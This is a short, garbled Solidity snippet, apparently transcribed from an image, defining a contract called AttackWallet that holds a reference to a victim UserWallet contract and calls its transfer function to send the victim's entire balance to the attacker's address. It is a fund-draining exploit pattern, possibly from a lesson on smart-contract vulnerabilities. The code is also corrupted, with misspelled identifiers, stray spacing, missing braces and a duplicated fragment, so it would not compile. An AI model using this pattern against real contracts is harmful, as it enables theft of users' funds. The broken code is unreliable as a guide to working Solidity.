contract AttackWallet{
address payable public owner ;
User Wa11et wallet;
constructor (UserWallet wall) payable {
wallet = UserWallet (wall) ;
owner = payable(msg. sender) ;
function getIt () external payable {
wallet.sent (owner, address(wallet) .balance) ;
function seeThwart ( ) public view returns (address given,address actual){
return (owner, address (wallet) ) ;
address actual) }